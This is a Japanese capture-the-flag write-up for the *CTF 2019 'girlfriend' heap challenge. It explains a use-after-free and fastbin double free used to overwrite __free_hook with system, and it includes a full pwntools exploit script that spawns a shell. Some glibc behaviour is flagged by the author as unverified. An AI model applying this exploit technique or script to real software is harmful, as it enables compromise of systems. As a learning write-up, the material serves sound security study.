---
tags: pwn
---

# \*CTF 2019 - girlfriend

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## Writeup

### Outline

delete時にポインタを破棄しないのでDouble Freeもあるし、UAF(read)も出来る
libc 2.29(環境が無いので2.31で解きましたが...)なのでtcacheは使えるのだがDouble Freeは出来ない
そこでtcacheを埋めてfastbinへ送り、そこでDouble Freeさせる。検知機構がそこそこ緩く、A -> B -> Aのようなリンクリストを構成することが出来る。これでAを書き換えればお好きなアドレスをリンクリスト中のfdメンバに放り込めるので`__free_hook`を放り込んでシェル起動用の値を入れる
ちなみに当然libc leakが必要なのだが、可変mallocなので0x420以上のチャンクを作ってfreeしてUAF(read)で良い

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Binary

* 保持可能ポインタ: 100
* mallocサイズ: 可変
* コマンド
    * add: create+edit
    * show: 中身の開示
    * edit: 何もしない(実装してないよって言われる)
    * call: delete、ポインタを破棄しないのでDouble FreeもUAF(read)もある
    * exit: さようなら
* コマンド実行回数制限: 無し

他のHeap問題とやや違うのはadd時に2つのmallocが走ることである。
最初に`malloc(0x18)`で次のような構造体が作られる

```c
struct girl {
    char *name;
    int size;
    char tell[12];
};
```

その後、`size`を入力するよう要求されて`malloc(size)`が走り、その返り値のポインタが`name`メンバに入る。

delete時は何故か`girl`はfreeされず、`name`だけがfreeされる。そういうわけでtcacheの様子を考えるのは多少楽になる。
なお、どちらのポインタもdelete時にクリアされることは無いので`name`メンバに対してDouble FreeとUAF(read)ができる

### libc leak

今回はサイズ制限も無いので0x420以上のチャンクを確保するようなmallocを発動させてfreeするとnameメンバのfd, bkに`&main_arena->top`が降ってくる。UAF(read)があるのでこれでlibc leakが出来る。
最近の問題はこれが出来なくてチャンクのOverlapとか要求されて発狂してたので助かる

### fastbinでのDouble Free

tcache(~2.27)と違い、fastbinは同じチャンクに対して2回連続でfreeするとAbortする。しかしfastbinの先頭に無いチャンクならfreeされても特に怒られない、よってあるサイズのfastbinが`top -> B -> A -> null`となっている時にAをfreeすると`top -> A -> B -> A`のようになる。
後はtcacheと同じ用にリンクリストを汚染することが出来、`A`を確保して編集することで`top -> B -> A -> x`のようになる。この状態で3回mallocをすることで`x`がチャンクとして得られる(但し、サイズチェックが走るが今回は下記のtcacheに注ぎ込まれる仕様のおかげで特に考えなくても良い)

当然だが、tcacheに余裕があるなら先にそちらにエントリーが入るのでまずはtcacheに7つエントリーを放り込む必要がある。
その状態でfreeすると該当サイズのfastbinに入り、これでようやくfastbinの汚染作業に取り掛かることが出来る

### `__free_hook`をチャンクとして得る

fastbinはmalloc時/free時にチャンクサイズ(`mchunk_size`メンバ)が正当かどうかを確認する。そこで`__free_hook`をそのままチャンクとして確保しようとしても`mchunk_size`が0でチャンクとして色々問題があるのでabortする。
ここで前後の値を見ると0x10離れたところに`0x7faadeadbeef`のような数値が入っている。リトルエンディアンなので実際にメモリに入っている様子は次のようになっている。

```
__free_hook - 0x10: ef be ad de aa 7f 00 00
__free_hook - 0x08: 00 00 00 00 00 00 00 00
__free_hook       : 00 00 00 00 00 00 00 00 <- まだ何も入っていない
```

これをちょっとだけずらして見てみると次のようになる

```
__free_hook - 0x0b: 7f 00 00 00 00 00 00 00
__free_hook - 0x03: 00 00 00 00 00 00 00 00
                            ^
                            |- ここから__free_hook
```

というわけで`__free_hook`を上書き出来そうな位置(`__free_hook - 0x03`)にサイズ`0x7f`のチャンクが存在していることになる。これを悪用して`_free_hook - 0x3`をfastbinに放り込み、ゴミ3バイトに続いて値を書き込むと任意のアドレスを`__free_hook`に入れることが出来る

と、いう仕様だったのだが下記のfastbinからtcacheへチャンクが移される仕様によって特に気にしなくて良かった

### fastbinからtcacheへ移される

さて、fastbinに`__free_hook`を設置できたので後はこのサイズでmallocを繰り返すだけである、そこでまずはaddを繰り返してtcacheを空にし、fastbinからチャンクが取られるようにする。

※以下、今回デバッガで覗きながら確認した挙動でまだglibcを読んだり真面目な検証はしていません

上のDouble Freeから`__free_hook`をfastbinに入れる動作の検証をしている時に気付いたのだが、tcacheが空の時にfastbinから取ろうとするとどうもfastbinに存在するチャンクを順序を維持したままtcacheに入れるらしい。この時、どういう事情かは知らないが`A -> B -> A`となっている状態でaddして`x`を`A`に書き込んだとしてもtcacheには何故か`B -> A -> x`が入っている(もちろんカウンタは3)(※要調査)。
更にサイズチェックも無いようで`x`の`mchunk_size`メンバがサイズとして不適切でもtcacheに入ってくれ、上のようにサイズヘッダを`0x7f`にするような配慮をしなくても`x`はtcacheのエントリーとなる。

### いつもの

後はtcacheが`A -> B -> __free_hook`となっているので3回addして値を入れて適当にfreeして`system("/bin/sh")`を呼ぶだけである。
配布libc, ldを強引に使っているせいか知らないがシェルは起動しているようで直ぐに落ちてしまったので2.31対応版でやったら普通にシェルが起動した
この辺の環境別に何かをするというのも色々考えないといけない

## Code

(※glibc 2.31用になっています)

```python
from pwn import process, ELF, p64, u64


def select(s, sel, c=b"Input your choice:"):
    s.recvuntil(c)
    s.sendline(str(sel))


def add(s, size, name=b"/bin/sh\x00", phone=b"/bin/sh\x00"):
    select(s, 1)
    s.recvuntil(b"Please input the size of girl's name\n")
    s.sendline(str(size))
    s.recvuntil(b"please inpute her name:\n")
    s.send(name)
    s.recvuntil(b"please input her call:\n")
    s.send(phone)


def show(s, index):
    select(s, 2)
    s.sendline(str(index))
    s.recvuntil(b"name:\n")
    name = s.recvline().rstrip()
    s.recvuntil(b"phone:\n")
    phone = s.recvline().rstrip()
    return name, phone


def delete(s, index):
    select(s, 4)
    s.recvuntil(b"Please input the index:\n")
    s.sendline(str(index))


if __name__ == '__main__':
    """
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    """
    # s = process(["./ld-2.29.so", "./chall_2"], env={"LD_PRELOAD": "./libc.so.6"})
    s = process("./chall_2")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    free_hook_libc = libc.symbols["__free_hook"]
    malloc_hook_libc = libc.symbols["__malloc_hook"]
    system_libc = libc.symbols["system"]
    # main_arena_libc = 0x7f509f9bac40 - 0x7f509f609000
    # onegadgets = [0xc224f, 0xdf991, 0xdf99d]
    main_arena_libc = 0x1ebbe0 - 0x60

    for _ in range(7):
        add(s, 0x28)

    add(s, 0x418)  # 7
    add(s, 0x28)   # 8
    add(s, 0x28)   # 9

    for i in range(7):
        delete(s, i)

    delete(s, 7)
    libc_addr = u64(show(s, 7)[0].ljust(8, b"\x00")) - main_arena_libc - 0x60
    print(hex(libc_addr))

    delete(s, 8)
    delete(s, 9)
    delete(s, 8)
    for _ in range(7):
        add(s, 0x28)  # 10 ~ 16

    add(s, 0x28, p64(libc_addr + free_hook_libc)) # 17
    add(s, 0x28) # 18
    add(s, 0x28)  # 19
    add(s, 0x28, p64(libc_addr + system_libc))  # 20

    add(s, 0x28, b"/bin/sh", b"/bin/sh")  # 21
    delete(s, 21)

    s.interactive()

```

## Flag

ローカルでシェル取っただけ

## 感想

デバッガで覗いてやっとfastbin周りの挙動が分かったのでglibcを読んでしっかりまとめたい。今の所経験則とちょっとした検索でこうだろうと言っているがしっかり読み込まないとそのうち痛い目に遭いそうな気がする